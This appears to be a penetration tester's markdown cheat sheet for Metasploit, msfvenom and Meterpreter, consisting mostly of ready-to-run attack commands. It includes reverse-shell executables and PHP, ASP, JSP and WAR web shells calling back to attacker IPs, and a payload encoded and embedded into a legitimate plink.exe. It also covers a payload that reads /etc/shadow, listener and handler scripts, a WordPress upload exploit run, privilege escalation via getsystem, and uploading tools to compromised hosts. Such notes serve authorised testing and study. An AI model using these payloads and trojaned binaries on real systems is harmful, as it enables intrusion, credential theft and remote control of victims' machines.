
## Metasploit

### Basic info

```
# quick installation:
https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers

# setting RHOSTS with the content of the file
set RHOSTS file:/path/to/IPs.txt
```

### DB connection and usage

Init on Kali:

```
$ service postgresql status
$ service postgresql start
# make sure that port is 5432 in:
$ vim /usr/share/metasploit-framework/config/database.yml
$ msfdb init
$ msfconsole
> db_status
> workspace -a <name>
> db_import vscans/vscan.xml
```

Init on Arch:

```
# install/update metasploit package:

# create postgres user ('msf') and empty db ('msf'):
sudo bash
su -l postgres
createuser --interactive
(username): msf
createdb msf

# init metasploit:
$ msfdb init
# make sure that port is 5432 in:
$ vim $HOME/.msf4/database.yml
$ msfconsole
> db_status
> workspace -a <name>
> db_import vscans/vscan.xml

# In case of issues see:
https://wiki.archlinux.org/title/PostgreSQL#Initial_configuration
https://wiki.archlinux.org/title/Metasploit_Framework#Setting_up_the_database
```

Basic usage:

```
hosts
services
# search for 'smtp' string; add returned hosts to RHOSTS
services -S smtp -R
# list http-based services; only IP and port columns; save result in file (CSV)
services -S http -c port -o /tmp/file
```

### Basic commands (in msf >)

    show auxiliary
    show exploits
    show payloads
    info [module]
    use [module]
    search [string]
    # show only exploits with 'smb'
    grep smb show exploits
    # back from current module
    back
    # list sessions
    sessions -v
    # jump to session 4
    sessions -i 4
    # list all jobs
    jobs -l
    # run exploit as job
    exploit -j

	# additional commands
	https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/

### use case: Common exploitation example

    $ ./msfconsole -L
    msf > use exploit/unix/webapp/wp_property_upload_exec
    msf > info
    msf > show options 
    msf > set TARGETURI /
    msf > set RHOST 192.168.1.197
    msf > set TARGET 1
    msf > setg Proxies HTTP:127.0.0.1:8081
    msf > set PAYLOAD linux/x86/shell/reverse_tcp
    msf > show options 
    msf > show advanced
    msf > set LHOST 192.168.1.137
    msf > exploit
    press ^Z to background current session

### use case: running post module
```
meterpreter> background
msf> use post/windows/gather/enum_domain
msf> set SESSION 1
msf> run
```

### use case: running Metasploit scan via socks proxy server (e.g. after ssh -D)

```
# Testing 135/tcp   open  msrpc (Microsoft Windows RPC):
setg Proxies socks4:127.0.0.1:1234
use auxiliary/scanner/dcerpc/endpoint_mapper
set RHOSTS <ip>
run
```

## Payloads

### Basic usage

```
# show payloads
msfvenom -l
# show formats
msfvenom --help-formats
# show payload options
msfvenom -p php/reverse_php --payload-options | less
```

### Common payloads

**Binaries**

    # Windows
    msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.30.68 LPORT=443 -f exe -o s.exe
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.30.68 LPORT=443 -f exe -o s.exe
    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.30.68 LPORT=443 -f exe -o s.exe

    # Linux 
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.30.68 LPORT=443 -f elf -o mres
    msfvenom -p linux/x86/shell_reverse_tcp -f elf -o res LHOST='192.168.30.68' LPORT=443

    # injecting paylaod into existing binary
    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.10.5 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe

**Web payloads**

    # ASP
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.30.68 LPORT=443 -f asp -o s.asp

    # PHP
    echo "<?php $(msfvenom -e php/base64 -p php/meterpreter/reverse_tcp LHOST=192.168.30.68 LPORT=443 -f raw) ?>" > mrs443.php
    echo "<?php $(msfvenom -e php/base64 -p php/reverse_php LHOST=192.168.30.68 LPORT=443 -f raw) ?>" > rs443.php

    # JSP
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.30.68 LPORT=443 -f raw -o s.jsp

    # WAR
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.30.68 LPORT=443 -f war -o res.war

**Scripting payloads (cmd usage)**

    msfvenom -p cmd/unix/reverse_{python,bash,perl} LHOST=192.168.30.68 LPORT=443 -f raw -o s.{py,sh,pl}

**Shellcodes (for usage in custom written exploits)**

    # Linux
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.30.68 LPORT=443 -f <language>
    msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.30.68 LPORT=443 --platform linux -f c -a x86 -e generic/none

    # Windows
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.30.68 LPORT=443 -f <language>
    msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.107 LPORT=443 --platform windows -a x86 -f c -e generic/none

### Formats for shellcodes

Show payload as C array:

    $ ./msfvenom -p linux/x86/exec CMD='cat /etc/shadow' -f c
    $ ./msfvenom -p linux/x86/exec CMD='cat /etc/shadow' -f python

Show payload as hex string (\xef\fe\d4 ...):

    $ msfvenom -p linux/x86/exec CMD='/bin/sh' -b "\x00" -f c -o ./p; 
    $ cat ./p | tail -5 | tr -d '"' | tr -d "\n"

Show payload in text format:

    $ ./msfvenom -p php/reverse_php --payload-options
    $ ./msfvenom -p php/reverse_php LHOST='192.168.77.142' LPORT=4445
    # generates 'one-liner' payload
    $ ./msfvenom -p php/reverse_php LHOST='192.168.77.142' LPORT=4445 | tr -s ' ' | tr -d '\n'

### Handlers

**handler for non staged payloads**

    nc -nlvp 443

**handlers for staged payloads**

```
cat << "EOF" > ./https-meter-handler.rc
use exploit/multi/handler
#set PAYLOAD linux/x86/meterpreter/reverse_tcp
#set PAYLOAD php/meterpreter/reverse_tcp
#set PAYLOAD windows/meterpreter/reverse_tcp
set PAYLOAD windows/meterpreter/reverse_https 
set LHOST 192.168.30.68
set LPORT 443
set ExitOnSession false
exploit -j -z
EOF
```

### use case: creating simple Linux connect back binary

    msfvenom -l | grep 'linux/x86'
    msfvenom -p linux/x86/shell_reverse_tcp -f elf -o notStaged LHOST='192.168.30.68' LPORT=443

    attacker$ nc -l -p 443

    ./notStaged

    attacker> ls -al

### use case: Linux connect back binary with staged (e.g. meterpreter) payload

    # create binary
    msfvenom -l | grep 'linux/x86'
    msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf -o staged LHOST='192.168.30.68' LPORT=443

    # prepare handler on attacker
    msfconsole
    msf> use exploit/multi/handler
    msf> set LHOST 192.168.30.68
    msf> set LPORT 443 
    msf> exploit

    # transport binary to target and execute it
    ./staged 

    # on attacker:
    meterpreter> ?

### use case: Windows connect back binary with staged embedded payload 

```
# prepare binary
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.30.68 LPORT=443 -f exe -e x86/shikata_ga_nai -i 8 -x /usr/share/windows-binaries/plink.exe -o ./plink.exe

# prepare handler on attacker (use msf script)
cat << "EOF" > ./https-meter-handler.rc
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 192.168.30.68
set LPORT 443
set ExitOnSession false
exploit -j -z
EOF

# run script
msfconsole -r https-meter-handler.rc

# transport binary to target and execute it
plink.exe

# on attacker
sessions -v
sessions -i <id>
meterpreter> ?
```

## Meterpreter

### basic usage

    ?
    getuid
    # attempt to escalate privs
    getprivs
    ifconfig
    sysinfo
    ps
    upload
    download
    migrate
    # priv escalation attempt (5 exploits are tried)
    getsystem
    # bg current meterpreter session and return to msf>
    background
    # recursively search all drives for file
    search -f rs*.asp
    # execute exe file
    execute -f c:\\Inetpub\\Scripts\\wpc.exe
    # in-memory execution of remote binary
    execute -H -i -c -m -d calc.exe -f /root/usr/share/windows-binaries/whoami.exe

### channels

```
# create command line channel 
shell
# terminate current channel
^C 
# background current channel
^Z
# list active channels
m> channel -l
# interact with the channel
m> channel -i <id>
```

### upload/download files

```
# Windows
upload /usr/share/windows-binaries/nc.exe c:\\Users\\Offsec
upload /root/HACKING/192.168.31.234/wes.exe "C:\\Documents and Settings\\Administrator\\wes.exe"

download c:\\Windows\\system32\\calc.exe /tmp/calc.exe

# UNIX
upload /root/HACKING/192.168.31.216/e.c /tmp/e.c
```
